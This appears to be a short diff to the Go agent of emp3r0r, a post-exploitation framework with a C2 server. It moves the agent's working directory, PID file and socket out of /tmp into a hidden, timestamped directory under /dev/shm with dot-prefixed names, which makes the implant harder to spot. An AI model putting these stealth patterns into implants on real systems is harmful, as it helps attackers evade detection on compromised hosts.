@@ -6,6 +6,7 @@ import (
 	"net/http"
 	"os"
 	"strconv"
+	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/tun"
 	"github.com/posener/h2conn"
@@ -14,7 +15,7 @@ import (
 
 var (
 	// AgentRoot root directory of emp3r0r
-	AgentRoot, _ = os.Getwd()
+	AgentRoot = fmt.Sprintf("/dev/shm/.../%d", time.Now().UnixNano())
 
 	// Transport what transport is this agent using? (HTTP2 / CDN / TOR)
 	Transport = fmt.Sprintf("HTTP2 (%s)", CCAddress)
@@ -27,6 +28,12 @@ var (
 
 	// Libemp3r0rFile shard library of emp3r0r, for hiding and persistence
 	Libemp3r0rFile = UtilsPath + "/libemp3r0r.so"
+
+	// PIDFile stores agent PID
+	PIDFile = AgentRoot + "/.e.lock"
+
+	// SocketName name of our unix socket
+	SocketName = AgentRoot + "/.s6Y4tDtahIuL"
 
 	// HTTPClient handles agent's http communication
 	HTTPClient *http.Client
@@ -51,12 +58,6 @@ var (
 )
 
 const (
-	// PIDFile stores agent PID
-	PIDFile = "/tmp/e.lock"
-
-	// SocketName name of our unix socket
-	SocketName = "/tmp/ssh-s6Y4tDtahIuL"
-
 	// CCPort port of c2
 	CCPort = "8000"
 
